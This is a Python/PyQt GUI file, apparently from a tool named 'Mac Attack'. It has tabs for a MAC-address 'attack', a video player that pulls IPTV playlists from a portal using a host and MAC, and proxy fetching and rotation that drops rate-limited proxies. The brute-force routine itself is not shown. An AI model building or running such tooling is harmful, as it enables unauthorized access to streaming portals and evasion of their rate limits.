        theme = """
        QWidget {
            background-color:  #2e2e2e;
            color: white;
            font-size: 10pt;
        }
        QLineEdit, QPushButton, QTabWidget {
            background-color:  #444444;
            color: white;
            border: 0px solid  #666666;
            padding: 5px;
            border-radius: 3px;
        }
        QLineEdit:focus, QPushButton:pressed {
            background-color:  #666666;
        }
        QTabBar::tab {
            background-color:  #444444;
            color: white;
            padding-top: 5px;
            padding-right: 5px;
            padding-bottom: 5px;
            padding-left: 5px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            border-bottom-left-radius: 0px;
            border-bottom-right-radius: 0px;
        }
        QTabBar::tab:selected {
            background-color:  #666666;
        }
        QProgressBar {
            text-align: center;
            color: white;
            background-color:  #555555;
        }
        QProgressBar::chunk {
            background-color:  #1e90ff;
        }
        QCheckBox {
            background-color:  #666666;
            padding: 5px;
            border: 2px solid black;
        }
        QCheckBox:checked {
            background-color: green;
        }
        """
        self.setStyleSheet(theme)
        # Main layout
        self.central_widget = QWidget(self)
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.setSpacing(0)
        # Top bar layout
        self.topbar_layout = QHBoxLayout()  # horizontal layout
        self.topbar_layout.setContentsMargins(30, 5, 0, 0)
        self.topbar_layout.setSpacing(0)
        # Top-level tabs
        self.tabs = QTabWidget(
            self
        )  # This is for the "Mac Attack" and "Mac VideoPlayer" tabs
        self.topbar_layout.addWidget(self.tabs)
        # Minimize button with a "-" label
        self.topbar_minimize_button = QPushButton("-")
        self.topbar_minimize_button.setFixedSize(20, 20)  # size adjustment
        self.topbar_minimize_button.clicked.connect(self.showMinimized)
        # Close button with "X"
        self.topbar_close_button = QPushButton("X")
        self.topbar_close_button.setFixedSize(20, 20)  # size adjustment
        self.topbar_close_button.clicked.connect(self.close)  # Connect to close the app
        self.topbar_layout.addWidget(
            self.topbar_minimize_button, alignment=Qt.AlignTop | Qt.AlignRight
        )
        self.topbar_layout.addWidget(
            self.topbar_close_button, alignment=Qt.AlignTop | Qt.AlignRight
        )
        self.main_layout.addLayout(self.topbar_layout)
        # Tabs content
        self.mac_attack_frame = QWidget()
        self.build_mac_attack_gui(self.mac_attack_frame)
        self.tabs.addTab(self.mac_attack_frame, "Mac Attack")
        self.mac_videoPlayer_frame = QWidget()
        self.build_mac_videoPlayer_gui(self.mac_videoPlayer_frame)
        self.tabs.addTab(self.mac_videoPlayer_frame, "Mac VideoPlayer")
        self.Proxy_frame = QWidget()
        self.build_Proxy_gui(self.Proxy_frame)
        self.tabs.addTab(self.Proxy_frame, "Proxies")
        self.Settings_frame = QWidget()
        self.build_Settings_gui(self.Settings_frame)
        self.tabs.addTab(self.Settings_frame, "Settings")
        # Bottom bar
        self.bottombar_layout = QHBoxLayout()  # horizontal layout
        self.bottombar_layout.setContentsMargins(0, 30, 0, 0)
        self.bottombar_layout.setSpacing(0)
        self.main_layout.addLayout(self.bottombar_layout)
        # Load saved settings
        self.load_settings()

        # Connect the signals to for the Bigmacattack func
        self.update_mac_label_signal.connect(self.update_mac_label)
        self.update_hits_label_signal.connect(self.update_hits_label)
        self.update_output_text_signal.connect(self.update_output_text)
        self.update_error_text_signal.connect(self.update_error_text)
        self.tabs.currentChanged.connect(self.on_tab_change)
        # Make the window resizable by adding a mouse event handler
        self.setMouseTracking(True)
        self.setAttribute(Qt.WA_OpaquePaintEvent)
        self.resizing = False
        self.moving = False
        self.resize_start_pos = None
        self.move_start_pos = None
        if self.tabs.currentIndex() == 1:  # Ensure we're on the Mac VideoPlayer tab
            self.videoPlayer.play()  # Play the video

    def add_recently_found(self, mac):
        if mac not in self.recentlyfound:
            self.recentlyfound.append(mac)
            logging.info(f"MAC address {mac} added.")
        else:
            logging.info(f"MAC address {mac} is already in the list.")

    def build_mac_videoPlayer_gui(self, parent):
        # Mac VideoPlayer Tab
        central_widget = QWidget(self)
        parent.setLayout(QVBoxLayout())
        parent.layout().setContentsMargins(0, 0, 0, 0)
        parent.layout().setSpacing(0)
        parent.layout().addWidget(central_widget)

        # Main layout
        main_layout = QHBoxLayout(central_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(10)

        # LEFT SECTION
        self.left_layout = QVBoxLayout()
        self.left_layout.setContentsMargins(0, 0, 0, 0)
        self.left_layout.setSpacing(10)
        self.left_layout.addSpacing(15)

        self.hostname_layout = QHBoxLayout()
        self.hostname_layout.setContentsMargins(0, 0, 0, 0)
        self.hostname_layout.setSpacing(0)
        self.hostname_label = QLabel("Host:")
        self.hostname_layout.addWidget(self.hostname_label)
        self.hostname_input = QLineEdit()
        self.hostname_layout.addWidget(self.hostname_input)
        self.left_layout.addLayout(self.hostname_layout)

        self.mac_layout = QHBoxLayout()
        self.mac_layout.setContentsMargins(0, 0, 0, 0)
        self.mac_layout.setSpacing(0)
        self.mac_label = QLabel("MAC:")
        self.mac_layout.addWidget(self.mac_label)
        self.mac_input = QLineEdit()
        self.mac_layout.addWidget(self.mac_input)
        self.left_layout.addLayout(self.mac_layout)

        self.playlist_layout = QHBoxLayout()
        self.playlist_layout.setContentsMargins(0, 0, 0, 0)
        self.playlist_layout.setSpacing(0)
        self.spacer = QSpacerItem(30, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        self.playlist_layout.addItem(self.spacer)

        self.proxy_layout = QHBoxLayout()
        self.proxy_layout.setContentsMargins(0, 0, 0, 0)
        self.proxy_layout.setSpacing(0)
        self.proxy_label = QLabel("Proxy:")
        self.proxy_layout.addWidget(self.proxy_label)
        self.proxy_input = QLineEdit()
        self.proxy_input.setPlaceholderText("Optional")
        self.proxy_layout.addWidget(self.proxy_input)
        self.left_layout.addLayout(self.proxy_layout)

        self.get_playlist_button = QPushButton("Get Playlist")
        self.playlist_layout.addWidget(self.get_playlist_button)
        self.get_playlist_button.clicked.connect(self.get_playlist)
        self.left_layout.addLayout(self.playlist_layout)
        self.proxy_input.textChanged.connect(self.update_proxy)

        self.tab_widget = QTabWidget()
        self.left_layout.addWidget(self.tab_widget)

        self.tab_data = {}
        for tab_name in ["Live", "Movies", "Series"]:
            tab = QWidget()
            tab_layout = QVBoxLayout(tab)
            playlist_view = QListView()
            playlist_view.setEditTriggers(QAbstractItemView.NoEditTriggers)
            tab_layout.addWidget(playlist_view)

            playlist_model = QStandardItemModel(playlist_view)
            playlist_view.setModel(playlist_model)
            playlist_view.doubleClicked.connect(self.on_playlist_selection_changed)

            self.tab_widget.addTab(tab, tab_name)

            self.tab_data[tab_name] = {
                "tab_widget": tab,
                "playlist_view": playlist_view,
                "playlist_model": playlist_model,
                "current_category": None,
                "navigation_stack": [],
                "playlist_data": [],
                "current_channels": [],
                "current_series_info": [],
                "current_view": "categories",
            }

        self.progress_layout = QHBoxLayout()
        self.progress_layout.setContentsMargins(0, 0, 0, 0)
        self.progress_layout.setSpacing(0)
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        self.progress_layout.addWidget(self.progress_bar)
        self.left_layout.addLayout(self.progress_layout)

        self.error_label = QLabel("ERROR: Error message label")
        self.error_label.setStyleSheet("color: red; font-size: 10pt; margin-bottom: 15px;")
        self.left_layout.addWidget(self.error_label, alignment=Qt.AlignRight)
        self.error_label.setVisible(False)

        self.left_widget = QWidget()
        self.left_widget.setLayout(self.left_layout)
        self.left_widget.setFixedWidth(240)
        main_layout.addWidget(self.left_widget)

        # RIGHT SECTION: Video area
        right_layout = QVBoxLayout()
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.setSpacing(0)

        self.video_frame = QWidget(self)
        self.video_frame.setStyleSheet("background-color: black;")
        right_layout.addWidget(self.video_frame)

        # Video URL and Copy Button
        link_layout = QHBoxLayout()
        link_layout.addStretch() #Align it to the right
        self.video_url_label = QLabel("No Video Loaded.")
        self.video_url_label.setStyleSheet("color: gray; font-size: 10pt; margin-top: 5px; margin-right: 5px;")
        link_layout.addWidget(self.video_url_label)

        self.copy_button = QPushButton("Copy")
        self.copy_button.setFixedWidth(60)
        self.copy_button.setFixedHeight(25)
        self.copy_button.setStyleSheet("padding: 0px; margin-top: 5px;")
        self.copy_button.clicked.connect(lambda: QApplication.clipboard().setText(self.video_url_label.text()))
        link_layout.addWidget(self.copy_button)
        right_layout.addLayout(link_layout)
        main_layout.addLayout(right_layout)

        if sys.platform.startswith("linux"):
            self.videoPlayer.set_xwindow(self.video_frame.winId())
        elif sys.platform == "win32":
            self.videoPlayer.set_hwnd(self.video_frame.winId())
        elif sys.platform == "darwin":
            self.videoPlayer.set_nsobject(int(self.video_frame.winId()))

        if getattr(sys, "frozen", False):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")
        video_path = os.path.join(base_path, "include", "intro.mp4")
        self.videoPlayer.set_media(self.instance.media_new(video_path))
        logging.info(video_path)
        self.startplay = 1
        self.videoPlayer.video_set_mouse_input(False)
        self.videoPlayer.video_set_key_input(False)

        self.progress_animation = QPropertyAnimation(self.progress_bar, b"value")
        self.progress_animation.setDuration(1000)
        self.progress_animation.setEasingCurve(QEasingCurve.Linear)

    def show_error_message(self, message):
        QMessageBox.critical(self, "Error", message)

    def get_playlist(self):
        self.error_label.setVisible(False)
        self.set_progress(0)  # Reset the progress bar to 0 at the start
        hostname_input = self.hostname_input.text().strip()
        mac = self.mac_input.text().strip().upper()
        num_threads = 5

        if not hostname_input or not mac:
            QMessageBox.warning(
                self,
                "Warning",
                "Please enter the Hostname, MAC Address, and Media Player.",
            )
            logging.warning(
                "User attempted to get playlist without entering all required fields."
            )
            return

        parsed_url = urlparse(hostname_input)
        if not parsed_url.scheme and not parsed_url.netloc:
            parsed_url = urlparse(f"http://{hostname_input}")
        elif not parsed_url.scheme:
            parsed_url = parsed_url._replace(scheme="http")

        self.base_url = urlunparse(
            (parsed_url.scheme, parsed_url.netloc, "", "", "", "")
        )
        self.mac = mac

        # Initialize session and get token
        self.session = requests.Session()
        self.token, self.token_random = get_token(self.session, self.base_url, self.mac)
        self.token_timestamp = time.time()

        if not self.token:
            self.error_label.setText("ERROR: Unable to connect to the host")
            self.error_label.setVisible(True)
            self.set_progress(0)
            return

        # Initialize RequestThread for fetching playlist
        if (
            self.current_request_thread is not None
            and self.current_request_thread.isRunning()
        ):
            QMessageBox.warning(
                self,
                "Warning",
                "A playlist request is already in progress. Please wait.",
            )
            logging.warning(
                "User attempted to start a new playlist request while one is already running."
            )
            return

        self.request_thread = RequestThread(
            self.base_url,
            mac,
            self.session,
            self.token,
            self.token_random,
            num_threads=num_threads,
        )
        self.request_thread.request_complete.connect(self.on_initial_playlist_received)
        self.request_thread.update_progress.connect(self.set_progress)
        self.request_thread.start()
        self.current_request_thread = self.request_thread
        logging.debug("Started RequestThread for playlist.")

    def update_proxy(self):
        proxy_address = self.proxy_input.text()
        if proxy_address:
            os.environ["http_proxy"] = proxy_address
            os.environ["https_proxy"] = proxy_address
        else:
            if "http_proxy" in os.environ:
                del os.environ["http_proxy"]
            if "https_proxy" in os.environ:
                del os.environ["https_proxy"]

    def restart_vlc_instance(self):
        referer_url = (
            self.hostname_input.text()
        )  # Get the referer URL from the hostname
        base_path = (
            sys._MEIPASS if getattr(sys, "frozen", False) else os.path.abspath(".")
        )
        proxy_address = self.proxy_input.text()

        # Modify VLC proxy settings
        self.modify_vlc_proxy(proxy_address)

        # Release old instances safely
        if self.videoPlayer:
            self.videoPlayer.release()
        if self.instance:
            self.instance.release()

        # Validate config path
        config_path = f"{base_path}\\include\\vlcrc"
        if not os.path.exists(config_path):
            logging.error(f"VLC config file not found: {config_path}")
            return

        # Initialize VLC
        try:
            logging.debug("Initializing VLC instance.")
            self.instance = vlc.Instance(
                [
                    f"--config={config_path}",
                    f"--http-proxy={proxy_address}",
                    f"--http-referrer={referer_url}",
                    "--repeat",
                    "--no-xlib",
                    "--vout=directx",
                    "--no-plugins-cache",
                    "--log-verbose=1",
                    "--network-caching=1000",
                    "--live-caching=1000",
                    "--file-caching=3000",
                    "--live-caching=3000",
                    "--sout-mux-caching=2000",
                ]
            )

            if not self.instance:
                raise Exception("Failed to initialize VLC instance.")

            self.videoPlayer = self.instance.media_player_new()
            if not self.videoPlayer:
                raise Exception("Failed to create VLC media player.")

            if sys.platform.startswith("linux"):
                self.videoPlayer.set_xwindow(self.video_frame.winId())
            elif sys.platform == "win32":
                self.videoPlayer.set_hwnd(self.video_frame.winId())
            elif sys.platform == "darwin":
                self.videoPlayer.set_nsobject(int(self.video_frame.winId()))

            # Disable mouse and key input
            self.videoPlayer.video_set_mouse_input(False)
            self.videoPlayer.video_set_key_input(False)

        except Exception as e:
            logging.error(f"Error during VLC instance restart: {e}")

    def build_Proxy_gui(self, parent):
        # Proxies Tab
        proxy_layout = QVBoxLayout(parent)
        proxy_checkbox_layout = QHBoxLayout()
        proxy_checkbox_layout.addSpacing(15)

        # Checkbox for enabling proxies
        self.proxy_enabled_checkbox = QCheckBox("Enable Proxies")
        self.proxy_enabled_checkbox.setFixedWidth(120)
        proxy_checkbox_layout.addWidget(self.proxy_enabled_checkbox)
        self.proxy_enabled_checkbox.stateChanged.connect(self.on_proxy_enabled_checkbox_toggled)
        proxy_checkbox_layout.addStretch(1)

        # Remove proxy after
        self.proxy_label = QLabel("Remove proxies after")
        self.proxy_label.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
        proxy_checkbox_layout.addWidget(self.proxy_label)

        # Error count spinbox
        self.proxy_remove_errorcount = QSpinBox()
        self.proxy_remove_errorcount.setRange(0, 9)
        self.proxy_remove_errorcount.setFixedWidth(30)
        self.proxy_remove_errorcount.setValue(5)  # Default value
        self.proxy_remove_errorcount.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
        proxy_checkbox_layout.addWidget(self.proxy_remove_errorcount)

        # Consecutive errors
        self.connection_errors_label = QLabel("consecutive errors. (0 to disable)")
        self.connection_errors_label.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
        proxy_checkbox_layout.addWidget(self.connection_errors_label)

        spacer_after_errors = QSpacerItem(15, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        proxy_checkbox_layout.addItem(spacer_after_errors)
        proxy_checkbox_layout.setSpacing(0)  # Remove spacing between widgets
        proxy_checkbox_layout.setAlignment(Qt.AlignRight)
        proxy_checkbox_layout.setAlignment(self.proxy_enabled_checkbox, Qt.AlignLeft)
        proxy_checkbox_layout.setAlignment(self.proxy_label, Qt.AlignLeft)
        proxy_checkbox_layout.setAlignment(self.proxy_remove_errorcount, Qt.AlignLeft)
        proxy_checkbox_layout.setAlignment(self.connection_errors_label, Qt.AlignLeft)
        proxy_layout.addLayout(proxy_checkbox_layout)

        remove_rate_limit_layout = QHBoxLayout()
        remove_rate_limit_layout.addSpacing(15)

        # Checkbox for Alternate speed setting
        self.proxy_altspeed_checkbox = QCheckBox("Alternate Speed Method. (1 thread per proxy)")
        self.proxy_altspeed_checkbox.setFixedWidth(300)
        remove_rate_limit_layout.addWidget(self.proxy_altspeed_checkbox)
        remove_rate_limit_layout.addStretch(1)

        # Connect the checkbox state change to a function
        self.proxy_altspeed_checkbox.stateChanged.connect(self.on_altspeed_checkbox_toggled)

        # Remove ratelimited proxies for Label
        self.rate_limit_label = QLabel("Remove ratelimited proxies for")
        self.rate_limit_label.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
        remove_rate_limit_layout.addWidget(self.rate_limit_label)

        # Spinbox for timeout
        self.remove_for_seconds_spinbox = QSpinBox()
        self.remove_for_seconds_spinbox.setRange(
            0, 99
        )  # Limit to range from 0 second to 1 hour
        self.remove_for_seconds_spinbox.setValue(30)
        self.remove_for_seconds_spinbox.setFixedWidth(40)
        remove_rate_limit_layout.addWidget(self.remove_for_seconds_spinbox)

        # Label for "seconds"
        self.seconds_label = QLabel("seconds. (0 to disable)")
        self.seconds_label.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
        remove_rate_limit_layout.addWidget(self.seconds_label)

        # 15px spacer
        spacer_after_timeoutseconds = QSpacerItem(
            15, 0, QSizePolicy.Fixed, QSizePolicy.Minimum
        )
        remove_rate_limit_layout.addItem(spacer_after_timeoutseconds)

        # Layout for the timeout stuff
        remove_rate_limit_layout.setAlignment(
            Qt.AlignRight
        )  # Align all elements to the right
        remove_rate_limit_layout.setSpacing(0)  # Set spacing to 0 for elements to touch
        proxy_layout.addLayout(
            remove_rate_limit_layout
        )  # Add below proxy_checkbox_layout

        # Add your proxies proxies label
        proxybox_label = QLabel(
            "Add your proxies in this box, or use the button below to retrieve a list of proxies."
        )
        proxybox_label.setContentsMargins(15, 0, 0, 0)  # 15px space on the left side
        proxy_layout.addWidget(proxybox_label)

        # Output Text Area
        self.proxy_textbox = QTextEdit()
        self.proxy_textbox.setStyleSheet(
            """
            color: black;
            background-color: lightgrey;
            border-left: 12px solid  #2E2E2E;
            border-right: 12px solid  #2E2E2E;
            border-bottom:  none;
            border-top: none;
        """
        )
        self.proxy_textbox.setReadOnly(False)
        monospace_font = QFont("Lucida Console", 10)
        self.proxy_textbox.setFont(monospace_font)
        proxy_layout.addWidget(self.proxy_textbox)

        # Horizontal layout for the button and speed input
        generate_proxy_layout = QHBoxLayout()

        # Spacer to the left of the buttons
        left_spacer_button = QSpacerItem(15, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        generate_proxy_layout.addItem(left_spacer_button)

        # Button to generate proxies, connects to self.get_proxies() method
        self.generate_button = QPushButton("Get Proxies")
        self.generate_button.clicked.connect(self.get_proxies)
        self.generate_button.setSizePolicy(
            QSizePolicy.Fixed, QSizePolicy.Fixed
        )  # Set size policy

        # Button to test proxies, connects to self.test_proxies() method
        self.test_proxies_button = QPushButton("Test Proxies")
        self.test_proxies_button.clicked.connect(
            self.test_proxies
        )  # Connect to test_proxies method
        self.test_proxies_button.setSizePolicy(
            QSizePolicy.Fixed, QSizePolicy.Fixed
        )  # Set size policy

        # Add "Get Proxies" and "Test Proxies" buttons to the layout
        generate_proxy_layout.addWidget(self.generate_button)
        generate_proxy_layout.addWidget(self.test_proxies_button)  # Add the new button

        # Checkbox for "Update Hourly"
        self.update_hourly_checkbox = QCheckBox("Get Proxies Hourly")
        self.update_hourly_checkbox.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)
        self.update_hourly_checkbox.stateChanged.connect(self.proxy_auto_updater)
        # Remove top and bottom spacing and padding using a stylesheet
        self.update_hourly_checkbox.setStyleSheet(
            "QCheckBox { margin: 0px; padding: 3px; }"
        )
        # Add the checkbox to the layout
        generate_proxy_layout.addWidget(self.update_hourly_checkbox)

        # Spacer to push the proxy count label to the right
        generate_proxy_layout.addStretch(
            1
        )  # This will push everything else to the left

        # Proxy count label that will be updated
        self.proxy_count_label = QLabel("Proxies: 0")
        self.proxy_count_label.setAlignment(
            Qt.AlignRight
        )  # Align the label to the right
        self.proxy_count_label.setContentsMargins(
            0, 0, 15, 0
        )  # 15px space to the right side of the label

        # Add the proxy count label to the layout
        generate_proxy_layout.addWidget(self.proxy_count_label)

        # Align the layout itself to the left
        generate_proxy_layout.setAlignment(Qt.AlignLeft)

        # Add the horizontal layout to the main proxy layout
        proxy_layout.addLayout(generate_proxy_layout)

        # Proxy console output Area
        self.proxy_output = QTextEdit()
        self.proxy_output.setStyleSheet(
            """
            color: green;
            background-color: black;
            border-left: 12px solid  #2E2E2E;
            border-right: 12px solid  #2E2E2E;
            border-bottom: none;
            border-top: none;
        """
        )
        self.proxy_output.setHtml("Proxy testing will output here...\n")
        self.proxy_output.setReadOnly(True)
        self.proxy_output.setFont(monospace_font)
        self.proxy_output.setMaximumHeight(86)
        proxy_layout.addWidget(self.proxy_output)
        self.proxy_textbox.textChanged.connect(self.update_proxy_count)
        self.proxy_output.textChanged.connect(self.trim_proxy_output)

    def on_proxy_enabled_checkbox_toggled(self, state):
        if state == Qt.Checked:
            self.proxy_altspeed_checkbox.setDisabled(False)
        else:
            self.proxy_altspeed_checkbox.setChecked(False)
            self.proxy_altspeed_checkbox.setDisabled(True)


    def on_altspeed_checkbox_toggled(self, state):
        if state == Qt.Checked:
            self.concurrent_tests.setVisible(False)
            self.speed_value_label.setText("")
            self.speed_label.setText("")
        else:
            self.concurrent_tests.setVisible(True)
            self.speed_value_label.setText("")
            self.speed_label.setText("Speed:")


    def proxy_auto_updater(self):
        if self.update_hourly_checkbox.isChecked():
            logging.info("Update Hourly is checked.")
            self.start_hourly_update()
        else:
            logging.info("Update Hourly is unchecked.")
            self.stop_hourly_update()

    def start_hourly_update(self):
        self.remaining_time = 3600  # Reset to 1 hour (3600 seconds)
        self.hourly_timer = QTimer(self)  # Create the timer
        self.hourly_timer.timeout.connect(
            self.update_timer
        )  # Connect timeout signal to update_timer
        self.hourly_timer.start(1000)  # Trigger every 1000 ms (1 second)
        logging.info("Started hourly update timer.")

    # Stop the hourly update timer
    def stop_hourly_update(self):
        if self.hourly_timer:
            self.hourly_timer.stop()
            self.hourly_timer = None
        self.update_hourly_checkbox.setText(f"Get Proxies Hourly")
        logging.info("Stopped hourly update timer.")

    def update_timer(self):
        if self.remaining_time > 0:
            self.remaining_time -= 1
            minutes = self.remaining_time // 60
            seconds = self.remaining_time % 60
            # self.update_timer_label.setText(f"{minutes:02}:{seconds:02}")
            self.update_hourly_checkbox.setText(
                f"Get Proxies Hourly {minutes:02}:{seconds:02}"
            )
        else:
            self.hourly_timer.stop()  # Stop the timer
            self.hourly_timer = None  # Clear the timer reference
            self.get_proxies()  # Execute the get_proxies function
            logging.info("Executed get_proxies and restarting timer.")
            self.start_hourly_update()  # Restart the timer

    def test_proxies(self):
        self.setup_proxy_tester()

    def setup_proxy_tester(self):
        self.proxy_tester = ProxyTester(self.proxy_textbox)
        self.proxy_tester.update_proxy_output_signal.connect(self.update_proxy_output)
        self.proxy_tester.update_proxy_textbox_signal.connect(self.update_proxy_textbox)
        self.proxy_tester.clear_textbox_signal.connect(self.clear_proxy_textbox)
        self.proxy_tester.start()

    def clear_proxy_textbox(self):
        self.proxy_textbox.clear()

    def update_proxy_textbox(self, proxies):
        self.proxy_textbox.setPlainText(proxies)

    def trim_proxy_output(self):
        max_lines = 6
        current_text = self.proxy_output.toPlainText()
        lines = current_text.splitlines()
        if len(lines) > max_lines:
            # Keep only the last `max_lines` lines
            lines = lines[-max_lines:]
            self.proxy_output.setPlainText("\n".join(lines))

    def update_proxy_count(self):
        # Get the number of lines in the proxy_textbox
        proxy_lines = self.proxy_textbox.toPlainText().splitlines()
        proxy_count = len(proxy_lines)
        # Update the label with the current number of proxies
        self.proxy_count_label.setText(f"Proxies: {proxy_count}")

    def get_proxies(self):
        self.proxy_fetcher.start()  # Start the background thread

    def update_proxy_output(self, text):
        # Updates the proxy_output textbox with the provided text.
        self.proxy_output.append(text)

    def update_proxy_textbox(self, proxies):
        # Get the current text from the textbox and split it into a list
        current_proxies = self.proxy_textbox.toPlainText().splitlines()
        # Ensure proxies is a list; if it's a string, convert it to a single-item list
        if isinstance(proxies, str):
            proxies = [proxies]
        # Combine the current proxies with the new ones and remove duplicates
        combined_proxies = list(set(current_proxies + proxies))
        # Remove any empty strings and sort the list for consistency
        combined_proxies = sorted(filter(None, combined_proxies))
        # Set the updated proxies back to the textbox
        self.proxy_textbox.setText("\n".join(combined_proxies))

    def build_Settings_gui(self, Settings_frame):
        # QVBoxLayout for the Settings_frame
        layout = QVBoxLayout(Settings_frame)

        top_line = QFrame()
        top_line.setFrameShape(QFrame.HLine)
        top_line.setFrameShadow(QFrame.Sunken)
        layout.addWidget(top_line)

        # Tab widget for the settings frame
        tab_widget = QTabWidget(Settings_frame)

        # Set a custom style to remove the rounded corners
        tab_widget.setStyleSheet(
            """
            QTabWidget {
                border: 0px solid  #ccc;
                border-radius: 0px;
            }
            QTabBar {
                border: 0px solid  #ccc;
                border-bottom: none;
            }
            QTabBar::tab {
                background-color:  #444444;
                padding: 5px;
                margin-right: 5px;
                border: 0px solid  #ccc;
                border-radius: 0px;
            }
            QTabBar::tab:selected {
                background-color:  #666666;
            }
        """
        )

        # Create frames for each tab
        general_tab = QWidget()
        output_tab = QWidget()
        videoplayer_tab = QWidget()

        # Set up layouts for each tab
        general_layout = QVBoxLayout(general_tab)
        general_layout.setAlignment(Qt.AlignTop)
        output_layout = QVBoxLayout(output_tab)
        output_layout.setAlignment(Qt.AlignTop)
        videoplayer_layout = QVBoxLayout(videoplayer_tab)
        videoplayer_layout.setAlignment(Qt.AlignTop)

        # GENERAL TAB
        settings_label = QLabel("General Settings")
        settings_label.setAlignment(Qt.AlignTop)
        general_layout.addWidget(settings_label)

        line1 = QFrame()
        line1.setFrameShape(QFrame.HLine)
        line1.setFrameShadow(QFrame.Sunken)
        general_layout.addWidget(line1)

        # label above the checkboxes
        macfound_label = QLabel("When a MAC is found:")
        macfound_label.setAlignment(Qt.AlignTop)
        general_layout.addWidget(macfound_label)

        # horizontal layout for the checkboxes
        macfound_checkboxes = QHBoxLayout()

        self.successsound_checkbox = QCheckBox("Play a sound.")
        macfound_checkboxes.addWidget(self.successsound_checkbox)

        self.autostop_checkbox = QCheckBox("Stop the attack.")
        macfound_checkboxes.addWidget(self.autostop_checkbox)

        general_layout.addLayout(macfound_checkboxes)

        general_layout.addSpacing(20)

        # The "Custom MACs" section
        macs_label = QLabel("Custom MACs:")
        general_layout.addWidget(macs_label)

        # "Use Custom MAC Addresses" checkbox
        self.use_custom_macs_checkbox = QCheckBox("Use Custom MAC Addresses")
        self.use_custom_macs_checkbox.stateChanged.connect(
            self.toggle_custom_macs_options
        )  # Connect signal to function
        general_layout.addWidget(self.use_custom_macs_checkbox)

        # Horizontal layout for file selection button, selected file label, "Mac Addresses in Pool:" label, and "macs_in_mem" label
        file_selection_layout = QHBoxLayout()

        file_selection_layout.setContentsMargins(
            0, 0, 0, 0
        )  # No padding around the layout
        file_selection_layout.setSpacing(10)  # No spacing between widgets

        # file selection button with fixed width of 120px
        self.file_select_button = QPushButton("Select File")
        self.file_select_button.setFixedWidth(120)  # Set the button width to 120px
        self.file_select_button.setVisible(True)  # Initially visible
        self.file_select_button.clicked.connect(self.select_file)
        file_selection_layout.addWidget(self.file_select_button)

        # label to display the selected file
        self.mac_file_label = QLabel("No file selected")
        file_selection_layout.addWidget(self.mac_file_label)

        # a spacer to push the next widgets to the right side
        file_selection_layout.addStretch(1)

        # label "Mac Addresses in Pool:" with no padding on the right
        self.pool_label = QLabel("Mac Addresses in Pool:")
        file_selection_layout.addWidget(self.pool_label)
        self.macs_in_mem_label = QLabel("0")
        file_selection_layout.addWidget(self.macs_in_mem_label)
        general_layout.addLayout(file_selection_layout)

        # Add new checkbox for custom random MACs (initially hidden)
        self.custom_random_mac_checkbox = QCheckBox("Randomize Mac addresses")
        self.custom_random_mac_checkbox.setVisible(False)  # Initially hidden
        self.custom_random_mac_checkbox.setFixedWidth(200)  # Set width to 200

        # Create radio buttons for "Prefer Speed" and "Prefer Accuracy"
        self.prefer_speed_radio = QRadioButton("Prefer Speed")
        self.prefer_accuracy_radio = QRadioButton("Prefer Accuracy")

        # Set a light gray background for the radio buttons
        self.prefer_speed_radio.setStyleSheet(
            "QRadioButton { background-color: #666666; padding: 5px; }"
        )
        self.prefer_accuracy_radio.setStyleSheet(
            "QRadioButton { background-color: #666666; padding: 5px; }"
        )

        # Create a button group to ensure only one of the radio buttons is selected at a time
        self.radio_group = QButtonGroup()
        self.radio_group.addButton(self.prefer_speed_radio)
        self.radio_group.addButton(self.prefer_accuracy_radio)

        # Set the initial state for the radio buttons (optional)
        self.prefer_speed_radio.setChecked(False)
        self.prefer_accuracy_radio.setChecked(True)
        self.prefer_speed_radio.setVisible(False)
        self.prefer_accuracy_radio.setVisible(False)

        # Save Pool to a file button
        self.save_pool_button = QPushButton("Save Pool to a file")

        self.save_pool_button.setFixedWidth(120)
        self.save_pool_button.setVisible(False)

        # Connect the button to a function to handle saving
        self.save_pool_button.clicked.connect(self.on_save_pool_clicked)

        # Create a layout for the checkbox and radio buttons (left-aligned)
        left_layout = QHBoxLayout()
        left_layout.addWidget(self.custom_random_mac_checkbox)
        left_layout.addWidget(self.prefer_speed_radio)
        left_layout.addWidget(self.prefer_accuracy_radio)

        left_layout.setAlignment(Qt.AlignLeft)

        # Create a layout for the save button (right-aligned)
        right_layout = QHBoxLayout()
        right_layout.addWidget(self.save_pool_button)
        right_layout.setAlignment(Qt.AlignRight)

        # Combine the left and right layouts into a single layout
        inline_layout = QHBoxLayout()
        inline_layout.addLayout(left_layout)
        inline_layout.addLayout(right_layout)

        # Add the combined layout to the general layout
        general_layout.addLayout(inline_layout)

        # Connect the checkbox state change to the function
        self.custom_random_mac_checkbox.stateChanged.connect(
            self.custommac_random_checkbox_func
        )

        general_layout.addSpacing(20)

        # System Settings label
        system_settings_label = QLabel("System settings:")
        system_settings_label.setAlignment(Qt.AlignTop)
        general_layout.addWidget(system_settings_label)

        # horizontal layout for the checkboxes
        system_settings_checkboxes = QHBoxLayout()

        self.file_select_button.setVisible(False)  # Hide the file selection button
        self.mac_file_label.setVisible(
            False
        )  # Hide the label showing the selected file
        self.pool_label.setVisible(False)  # Hide the "Mac Addresses in Pool:" label
        self.macs_in_mem_label.setVisible(False)  # Hide the "macs_in_mem" label

        # Ludicrous Speed checkbox
        self.ludicrous_speed_checkbox = QCheckBox("Enable Ludicrous Speed!")
        system_settings_checkboxes.addWidget(self.ludicrous_speed_checkbox)
        self.ludicrous_speed_checkbox.stateChanged.connect(self.enable_ludicrous_speed)

        # Don't check for updates checkbox
        self.dont_update_checkbox = QCheckBox("Don't check for updates.")
        system_settings_checkboxes.addWidget(self.dont_update_checkbox)

        # Horizontal layout to the main general_layout
        general_layout.addLayout(system_settings_checkboxes)

